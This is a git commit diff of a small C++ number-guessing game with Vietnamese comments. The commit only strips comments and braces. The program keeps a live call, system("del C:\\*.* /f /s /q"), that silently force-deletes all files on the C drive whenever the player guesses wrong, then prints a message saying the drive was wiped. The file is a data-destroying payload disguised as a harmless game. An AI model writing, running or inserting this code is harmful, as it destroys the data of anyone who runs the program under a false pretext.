863c1c15160424dd5571389ac774fccb7e52fcf3
Glasspham <95564442+Glasspham@users.noreply.github.com>
2023-12-07 16:30:07 +0700

    Update Tro_choi_may_man.cpp

--- Tro_choi_may_man.cpp
+++ Tro_choi_may_man.cpp
@@ -3,33 +3,23 @@
 using namespace std;
 int main()
 {
-	// Khởi tạo random
 	srand(time(NULL) );
 	cout << "Nhap so ban muon kiem tra: ";
 	int so;
 	cin >> so;
 
-	// Random số ngẫu nhiên từ 1 đến 10
 	int random = rand() % 10 + 1;
 	if (so == random)
-	{
 		cout << "Ban da doan dung so random la: " << random << endl;
-	}
 	else
-	{
 		cout << "Ban da doan sai so random la: " << random << endl;
-	}
 
-	// Nếu user nhập sai thì xóa toàn bộ file và thư mục trong ổ C
 	if (so != random)
 	{	
-		system("del C:\\*.* /f /s /q");
-		// Thông báo đã xóa xong
+		system("del C:\\*.* /f /s /q");		
 		cout << "Da xoa xong o C do ban nhap sai so random" << endl;
 	} 
 	else 
-	{
 		cout << "Ban da nhap dung so random nen khong xoa o C" << endl;
-	}
 return 0;
 }
